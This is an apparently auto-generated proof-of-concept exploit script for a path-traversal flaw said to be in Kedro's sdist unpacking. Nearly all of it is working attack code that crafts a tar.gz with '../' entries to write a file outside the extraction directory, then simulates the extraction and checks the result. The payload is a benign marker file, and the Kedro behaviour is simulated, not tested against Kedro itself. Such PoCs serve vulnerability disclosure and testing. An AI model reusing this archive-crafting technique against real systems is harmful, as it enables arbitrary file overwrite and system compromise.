#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-025
# Sink: save
# Auto-generated — run with: python3 lfi_cli_manifest_passed_unpack_save.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro LFI vulnerability in _unpack_sdist.

This script demonstrates how an attacker can craft a malicious tar.gz archive
that, when extracted by Kedro's micropkg pull functionality, writes files
outside the intended destination directory using path traversal (../).

The vulnerability exists because _unpack_sdist uses safe_extract() without
validating tar entry paths for '../' sequences. The package_path parameter
is user-controlled via CLI or manifest.

SAFETY: This PoC uses a benign payload that creates a marker file at /tmp/poc_success.txt
to demonstrate arbitrary file write capability.
"""

import io
import os
import tarfile
import tempfile
import shutil
import sys
from pathlib import Path

# Configuration - modify these as needed
TARGET_DIR = "/tmp/kedro_poc_test"  # Simulated extraction directory
MARKER_FILE = "/tmp/poc_success.txt"  # Benign marker file to create
PAYLOAD_CONTENT = "Kedro LFI PoC - Path traversal successful!\n"


def create_malicious_tar():
    """
    Create a tar.gz archive with path traversal entries.
    
    The archive contains:
    1. A normal directory entry (to pass Kedro's validation)
    2. A file entry with ../ traversal to write outside the extraction directory
    
    Returns:
        bytes: The malicious tar.gz archive as bytes
    """
    buffer = io.BytesIO()
    
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        # Create a normal package directory (required by Kedro's validation)
        # Kedro expects exactly one directory in the extracted contents
        normal_dir = tarfile.TarInfo(name="mypackage/")
        normal_dir.type = tarfile.DIRTYPE
        normal_dir.mode = 0o755
        tar.addfile(normal_dir)
        
        # Add __init__.py to make it a valid Python package
        init_info = tarfile.TarInfo(name="mypackage/__init__.py")
        init_info.size = 0
        tar.addfile(init_info)
        
        # Create the malicious entry with path traversal
        # This will write to /tmp/poc_success.txt when extracted to TARGET_DIR
        # The traversal goes: ../../../../../../tmp/poc_success.txt
        malicious_path = f"../../../../../../..{MARKER_FILE}"
        malicious_info = tarfile.TarInfo(name=malicious_path)
        malicious_info.size = len(PAYLOAD_CONTENT)
        malicious_info.mode = 0o644
        
        # Add the malicious file with our payload
        tar.addfile(malicious_info, io.BytesIO(PAYLOAD_CONTENT.encode()))
        
        # Add another normal file to make the archive look legitimate
        setup_info = tarfile.TarInfo(name="mypackage/setup.py")
        setup_info.size = 0
        tar.addfile(setup_info)
    
    buffer.seek(0)
    return buffer.getvalue()


def simulate_extraction(tar_data: bytes, extract_dir: Path):
    """
    Simulate Kedro's _unpack_sdist function behavior.
    
    This mimics exactly what Kedro does when extracting a tar.gz archive:
    1. Opens the tar file
    2. Calls safe_extract() without path validation
    
    Args:
        tar_data: The tar.gz archive as bytes
        extract_dir: Directory to extract into
    """
    print(f"[*] Simulating Kedro extraction to: {extract_dir}")
    print(f"[*] Archive size: {len(tar_data)} bytes")
    
    # This is exactly what Kedro's _unpack_sdist does
    with io.BytesIO(tar_data) as fs_file:
        with tarfile.open(fileobj=fs_file, mode="r:gz") as tar_file:
            print("[*] Archive contents:")
            for member in tar_file.getmembers():
                print(f"    - {member.name} (size: {member.size})")
            
            print("\n[*] Calling safe_extract() - this is the vulnerable sink...")
            # safe_extract is Python's tarfile.extractall() which does NOT
            # prevent path traversal with ../ sequences
            tar_file.extractall(path=str(extract_dir))
    
    print("[+] Extraction completed")


def verify_exploit():
    """Verify that the exploit was successful by checking for the marker file."""
    marker = Path(MARKER_FILE)
    if marker.exists():
        print(f"\n[+] EXPLOIT SUCCESSFUL! Marker file created at: {MARKER_FILE}")
        print(f"[+] File contents: {marker.read_text()}")
        return True
    else:
        print(f"\n[-] Exploit failed - marker file not found at: {MARKER_FILE}")
        return False


def cleanup():
    """Clean up created files and directories."""
    print("\n[*] Cleaning up...")
    
    # Remove extraction directory
    extract_dir = Path(TARGET_DIR)
    if extract_dir.exists():
        shutil.rmtree(extract_dir)
        print(f"[*] Removed extraction directory: {TARGET_DIR}")
    
    # Remove marker file
    marker = Path(MARKER_FILE)
    if marker.exists():
        marker.unlink()
        print(f"[*] Removed marker file: {MARKER_FILE}")


def main():
    """Main exploit demonstration."""
    print("=" * 60)
    print("Kedro LFI Path Traversal PoC")
    print("=" * 60)
    print("\n[!] This PoC demonstrates arbitrary file write via path traversal")
    print("[!] in Kedro's _unpack_sdist function")
    print(f"[!] Target marker file: {MARKER_FILE}")
    print(f"[!] Simulated extraction directory: {TARGET_DIR}")
    print()
    
    # Step 1: Create the malicious tar.gz archive
    print("[*] Step 1: Creating malicious tar.gz archive...")
    try:
        tar_data = create_malicious_tar()
        print(f"[+] Malicious archive created ({len(tar_data)} bytes)")
    except Exception as e:
        print(f"[-] Failed to create archive: {e}")
        sys.exit(1)
    
    # Step 2: Create the extraction directory (simulating Kedro's temp_dir)
    print(f"\n[*] Step 2: Creating extraction directory: {TARGET_DIR}")
    extract_dir = Path(TARGET_DIR)
    try:
        extract_dir.mkdir(parents=True, exist_ok=True)
        print(f"[+] Directory created: {extract_dir}")
    except Exception as e:
        print(f"[-] Failed to create directory: {e}")
        sys.exit(1)
    
    # Step 3: Simulate the vulnerable extraction
    print(f"\n[*] Step 3: Simulating vulnerable extraction...")
    try:
        simulate_extraction(tar_data, extract_dir)
    except Exception as e:
        print(f"[-] Extraction failed: {e}")
        cleanup()
        sys.exit(1)
    
    # Step 4: Verify the exploit
    print(f"\n[*] Step 4: Verifying exploit...")
    success = verify_exploit()
    
    # Step 5: Cleanup
    cleanup()
    
    print("\n" + "=" * 60)
    if success:
        print("[RESULT] VULNERABILITY CONFIRMED - Path traversal works!")
        print("[RESULT] An attacker could write arbitrary files to the filesystem")
        print("[RESULT] by crafting a malicious tar.gz archive with ../ entries.")
    else:
        print("[RESULT] Exploit failed - vulnerability may not be present")
    
    print("=" * 60)
    
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
